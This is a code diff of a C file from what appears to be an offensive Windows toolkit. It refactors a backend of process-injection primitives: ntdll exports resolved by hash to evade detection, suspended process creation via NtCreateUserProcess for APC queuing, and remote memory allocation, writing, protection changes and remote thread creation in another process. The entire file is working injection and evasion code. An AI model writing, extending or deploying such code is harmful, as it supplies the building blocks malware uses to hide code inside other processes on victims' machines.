@@ -1,190 +1,191 @@
 #include <sindri/common/macros.h>
-#include <sindri/common/status.h>
+#include <sindri/common/string.h>
 #include <sindri/internal/nt/api.h>
-#include <sindri/parsers/env/peb.h>
-#include <sindri/parsers/pe/exports.h>
-#include <sindri/parsers/pe/parser.h>
+#include <sindri/internal/nt/base.h>
+#include <sindri/internal/nt/process.h>
+#include <sindri/internal/windows/types.h>
+#include <sindri/parsers/env/ntdll.h>
 #include <sindri/primitives/process.h>
+#include <sindri/primitives/status.h>
 #include <sindri_hashes.h>
-#include <windows.h>
-#include <winerror.h>
 
-static snd_status_t WINAPI nt_create_process(const wchar_t *image_path, const wchar_t *command_line,
-                                             HANDLE *out_process, HANDLE *out_thread) {
-    if (!out_process || !out_thread)
-        return SND_ERR(SND_STATUS_NULL_POINTER);
+static snd_status_t WINAPI nt_create_process_params(const void *nt_path_unicode, const wchar_t *cmd_line,
+                                                    PVOID *out_params) {
+    const SND_UNICODE_STRING *nt_path    = (const SND_UNICODE_STRING *)nt_path_unicode;
+    FARPROC                   pfn_create = NULL;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_RTLCREATEPROCESSPARAMETERSEX, &pfn_create));
 
-    STARTUPINFOW si         = {0};
-    si.cb                   = sizeof(si);
-    PROCESS_INFORMATION pi  = {0};
-    
-    // Create process in a suspended state for APC queuing
-    // Note: NtCreateUserProcess is too volatile/undocumented across OS builds,
-    // so we fall back to the Win32 subsystem for process creation even in the NT backend.
-    DWORD creation_flags = CREATE_SUSPENDED;
+    SND_UNICODE_STRING u_cmd = {0};
+    if (cmd_line) {
+        snd_init_unicode_string(&u_cmd, cmd_line, snd_wcsnlen(cmd_line, SND_UNICODE_STRING_MAX_CHARS));
+    }
 
-    BOOL ok = CreateProcessW(
-        image_path,
-        (LPWSTR)command_line,
-        NULL,
-        NULL,
-        FALSE,
-        creation_flags,
-        NULL,
-        NULL,
-        &si,
-        &pi
-    );
+    SND_RtlCreateProcessParametersEx_t pRtlCreate = (SND_RtlCreateProcessParametersEx_t)pfn_create;
+    NTSTATUS nt_status = pRtlCreate(out_params, (PSND_UNICODE_STRING)nt_path, NULL, NULL,
+                                    cmd_line ? &u_cmd : (PSND_UNICODE_STRING)nt_path, NULL, NULL, NULL, NULL, NULL, 1);
 
-    if (!ok)
-        return SND_ERR_W32(SND_STATUS_PROCESS_OPEN_FAILED); // REUSE OPEN_FAILED FOR NOW
+    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_PROCESS_CREATE_PARAMS_FAILED, nt_status);
+}
 
-    *out_process = pi.hProcess;
-    *out_thread = pi.hThread;
-    
-    return SND_OK;
+static snd_status_t WINAPI nt_free_process_params(PVOID params) {
+    if (!params) {
+        return SND_OK;
+    }
+
+    FARPROC pfn_destroy = NULL;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_RTLDESTROYPROCESSPARAMETERS, &pfn_destroy));
+
+    SND_RtlDestroyProcessParameters_t pRtlDestroy = (SND_RtlDestroyProcessParameters_t)pfn_destroy;
+    NTSTATUS                          nt_status   = pRtlDestroy(params);
+
+    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_PROCESS_FREE_PARAMS_FAILED, nt_status);
+}
+
+static snd_status_t WINAPI nt_create_process(const snd_process_api_t *api, const wchar_t *image_path,
+                                             const wchar_t *command_line, HANDLE *out_process, HANDLE *out_thread) {
+    SND_CHECK_NULL(out_process, out_thread, image_path);
+    *out_process = NULL;
+    *out_thread  = NULL;
+
+    FARPROC pfn_create_user_proc = NULL;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_NTCREATEUSERPROCESS, &pfn_create_user_proc));
+
+    SND_UNICODE_STRING u_win32_path = {0};
+    snd_init_unicode_string(&u_win32_path, image_path, snd_wcsnlen(image_path, SND_UNICODE_STRING_MAX_CHARS));
+
+    wchar_t nt_path[SND_MAX_PATH] = L"\\??\\";
+    snd_wcsncpy(nt_path + 4, SND_MAX_PATH - 4, image_path, SND_MAX_PATH - 4);
+
+    SND_UNICODE_STRING u_nt_path = {0};
+    snd_init_unicode_string(&u_nt_path, nt_path, snd_wcsnlen(nt_path, SND_UNICODE_STRING_MAX_CHARS));
+
+    PVOID process_params = NULL;
+    if (api && api->create_process_params) {
+        SND_TRY(api->create_process_params(&u_win32_path, command_line, &process_params));
+    }
+
+    SND_PS_CREATE_INFO create_info = {.Size = sizeof(create_info), .State = SND_PS_CREATE_INITIAL_STATE};
+
+    SND_PS_ATTRIBUTE_LIST attr_list             = {0};
+    attr_list.TotalLength                       = sizeof(SND_PS_ATTRIBUTE_LIST);
+    attr_list.Attributes[0].Attribute           = SND_PS_ATTRIBUTE_IMAGE_NAME;
+    attr_list.Attributes[0].Size                = u_nt_path.Length;
+    attr_list.Attributes[0].ValueUnion.ValuePtr = u_nt_path.Buffer;
+    attr_list.Attributes[0].ReturnLength        = NULL;
+
+    SND_NtCreateUserProcess_t pNtCreateUserProcess = (SND_NtCreateUserProcess_t)pfn_create_user_proc;
+    NTSTATUS                  nt_status =
+        pNtCreateUserProcess(out_process, out_thread, SND_PROCESS_ALL_ACCESS, SND_THREAD_ALL_ACCESS, NULL, NULL,
+                             0, // ProcessFlags = 0
+                             SND_THREAD_CREATE_FLAGS_CREATE_SUSPENDED, process_params, &create_info, &attr_list);
+
+    if (api && api->free_process_params) {
+        api->free_process_params(process_params);
+    }
+
+    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_PROCESS_CREATE_FAILED, nt_status);
 }
 
 static snd_status_t WINAPI nt_open_process(DWORD pid, DWORD desired_access, HANDLE *out_process) {
-    if (!out_process)
-        return SND_ERR(SND_STATUS_NULL_POINTER);
-
-    PVOID        ntdll;
-    snd_status_t status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
-    if (SND_FAILED(status))
-        return status;
+    SND_CHECK_NULL(out_process);
+    *out_process = NULL;
 
     FARPROC func_addr = NULL;
-    status = snd_pe_get_export_address_hash(ntdll, SND_SYS_DLL_SIZE_DEFAULT, SND_HASH_NTOPENPROCESS, &func_addr, NULL);
-    if (SND_FAILED(status))
-        return status;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_NTOPENPROCESS, &func_addr));
 
-    SND_CLIENT_ID cid = {0};
-    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
-    cid.UniqueThread  = 0;
-
-    SND_OBJECT_ATTRIBUTES oa = {0};
+    SND_CLIENT_ID         cid = {.UniqueProcess = (HANDLE)(ULONG_PTR)pid, .UniqueThread = 0};
+    SND_OBJECT_ATTRIBUTES oa  = {0};
     SND_InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
 
     SND_NtOpenProcess_t pNtOpenProcess = (SND_NtOpenProcess_t)func_addr;
     NTSTATUS            nt_status      = pNtOpenProcess(out_process, desired_access, &oa, (PVOID)&cid);
+
     return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_PROCESS_OPEN_FAILED, nt_status);
 }
 
 static snd_status_t WINAPI nt_alloc_remote(HANDLE process, SIZE_T size, DWORD allocation_type, DWORD protect,
                                            PVOID *out_address) {
-    if (!out_address)
-        return SND_ERR(SND_STATUS_NULL_POINTER);
-    PVOID        ntdll;
-    snd_status_t status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
-    if (SND_FAILED(status))
-        return status;
+    SND_CHECK_NULL(process, out_address);
+    *out_address = NULL;
 
     FARPROC func_addr = NULL;
-    status = snd_pe_get_export_address_hash(ntdll, SND_SYS_DLL_SIZE_DEFAULT, SND_HASH_NTALLOCATEVIRTUALMEMORY,
-                                            &func_addr, NULL);
-    if (SND_FAILED(status))
-        return status;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_NTALLOCATEVIRTUALMEMORY, &func_addr));
 
     PVOID  local_base = NULL;
     SIZE_T local_size = size;
 
     SND_NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (SND_NtAllocateVirtualMemory_t)func_addr;
     NTSTATUS nt_status = pNtAllocateVirtualMemory(process, &local_base, 0, &local_size, allocation_type, protect);
-    if (SND_NT_SUCCESS(nt_status)) {
-        *out_address = local_base;
-        return SND_OK;
+
+    if (SND_NT_FAILURE(nt_status)) {
+        return SND_ERR_NT(SND_STATUS_PROCESS_REMOTE_ALLOC_FAILED, nt_status);
     }
-    return SND_ERR_NT(SND_STATUS_PROCESS_OPEN_FAILED, nt_status);
+
+    *out_address = local_base;
+    return SND_OK;
 }
 
 static snd_status_t WINAPI nt_write_remote(HANDLE process, PVOID base_address, const void *buffer, SIZE_T size,
                                            SIZE_T *bytes_written) {
-    SIZE_T written = 0;
-
-    PVOID        ntdll;
-    snd_status_t status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
-    if (SND_FAILED(status))
-        return status;
+    SND_CHECK_NULL(process, base_address, buffer);
 
     FARPROC func_addr = NULL;
-    status = snd_pe_get_export_address_hash(ntdll, SND_SYS_DLL_SIZE_DEFAULT, SND_HASH_NTWRITEVIRTUALMEMORY, &func_addr,
-                                            NULL);
-    if (SND_FAILED(status))
-        return status;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_NTWRITEVIRTUALMEMORY, &func_addr));
 
+    SIZE_T                     written               = 0;
     SND_NtWriteVirtualMemory_t pNtWriteVirtualMemory = (SND_NtWriteVirtualMemory_t)func_addr;
     NTSTATUS                   nt_status = pNtWriteVirtualMemory(process, base_address, (PVOID)buffer, size, &written);
 
-    if (bytes_written)
+    if (bytes_written) {
         *bytes_written = written;
+    }
 
-    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_VIRTUAL_WRITE_FAILED, nt_status);
+    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_PROCESS_REMOTE_WRITE_FAILED, nt_status);
 }
 
 static snd_status_t WINAPI nt_protect_remote(HANDLE process, PVOID base_address, SIZE_T size, DWORD new_protect,
                                              DWORD *old_protect) {
+    SND_CHECK_NULL(process, base_address);
+
+    FARPROC func_addr = NULL;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_NTPROTECTVIRTUALMEMORY, &func_addr));
+
     PVOID  addr       = base_address;
     SIZE_T regionSize = size;
     ULONG  oldProt    = 0;
 
-    PVOID        ntdll;
-    snd_status_t status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
-    if (SND_FAILED(status))
-        return status;
+    SND_NtProtectVirtualMemory_t pNtProtectVirtualMemory = (SND_NtProtectVirtualMemory_t)func_addr;
+    NTSTATUS nt_status = pNtProtectVirtualMemory(process, &addr, &regionSize, new_protect, &oldProt);
 
-    FARPROC func_addr = NULL;
-    status            = snd_pe_get_export_address_hash(ntdll, SND_SYS_DLL_SIZE_DEFAULT, SND_HASH_NTPROTECTVIRTUALMEMORY,
-                                                       &func_addr, NULL);
-    if (SND_FAILED(status))
-        return status;
-
-    SND_NtProtectVirtualMemory_t pNtProtectVirtualMemory_t = (SND_NtProtectVirtualMemory_t)func_addr;
-    NTSTATUS nt_status = pNtProtectVirtualMemory_t(process, &addr, &regionSize, new_protect, &oldProt);
-
-    if (old_protect)
+    if (old_protect) {
         *old_protect = oldProt;
+    }
 
-    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_VIRTUAL_PROTECT_FAILED, nt_status);
+    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_PROCESS_REMOTE_PROTECT_FAILED, nt_status);
 }
 
 static snd_status_t WINAPI nt_create_remote_thread(HANDLE process, PVOID start_address, PVOID parameter,
                                                    HANDLE *out_thread) {
-    if (!out_thread)
-        return SND_ERR(SND_STATUS_NULL_POINTER);
+    SND_CHECK_NULL(out_thread, process, start_address);
     *out_thread = NULL;
 
-    PVOID        ntdll;
-    snd_status_t status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
-    if (SND_FAILED(status))
-        return status;
-
     FARPROC func_addr = NULL;
-    status =
-        snd_pe_get_export_address_hash(ntdll, SND_SYS_DLL_SIZE_DEFAULT, SND_HASH_NTCREATETHREADEX, &func_addr, NULL);
-    if (SND_FAILED(status))
-        return status;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_NTCREATETHREADEX, &func_addr));
 
     SND_NtCreateThreadEx_t pNtCreateThreadEx = (SND_NtCreateThreadEx_t)func_addr;
     NTSTATUS               nt_status =
-        pNtCreateThreadEx(out_thread, 0x1FFFFF, NULL, process, start_address, parameter, 0, 0, 0, 0, NULL);
+        pNtCreateThreadEx(out_thread, SND_THREAD_ALL_ACCESS, NULL, process, start_address, parameter, 0, 0, 0, 0, NULL);
 
-    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_THREAD_CREATE_FAILED, nt_status);
+    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_THREAD_REMOTE_CREATE_FAILED, nt_status);
 }
 
 static snd_status_t WINAPI nt_close_handle(HANDLE handle) {
-    if (!handle)
+    if (!handle || handle == INVALID_HANDLE_VALUE) {
         return SND_OK;
-
-    PVOID        ntdll;
-    snd_status_t status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
-    if (SND_FAILED(status))
-        return status;
+    }
 
     FARPROC func_addr = NULL;
-    status = snd_pe_get_export_address_hash(ntdll, SND_SYS_DLL_SIZE_DEFAULT, SND_HASH_NTCLOSE, &func_addr, NULL);
-    if (SND_FAILED(status))
-        return status;
+    SND_TRY(snd_ntdll_get_active_export(SND_HASH_NTCLOSE, &func_addr));
 
     SND_NtClose_t pNtClose  = (SND_NtClose_t)func_addr;
     NTSTATUS      nt_status = pNtClose(handle);
@@ -192,10 +193,12 @@ static snd_status_t WINAPI nt_close_handle(HANDLE handle) {
     return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_HANDLE_CLOSE_FAILED, nt_status);
 }
 
-const snd_process_api_t snd_proc_nt = {.create_process       = nt_create_process,
-                                       .open_process         = nt_open_process,
-                                       .alloc_remote         = nt_alloc_remote,
-                                       .write_remote         = nt_write_remote,
-                                       .protect_remote       = nt_protect_remote,
-                                       .create_remote_thread = nt_create_remote_thread,
-                                       .close_handle         = nt_close_handle};
+const snd_process_api_t snd_proc_nt = {.create_process_params = nt_create_process_params,
+                                       .free_process_params   = nt_free_process_params,
+                                       .create_process        = nt_create_process,
+                                       .open_process          = nt_open_process,
+                                       .alloc_remote          = nt_alloc_remote,
+                                       .write_remote          = nt_write_remote,
+                                       .protect_remote        = nt_protect_remote,
+                                       .create_remote_thread  = nt_create_remote_thread,
+                                       .close_handle          = nt_close_handle};
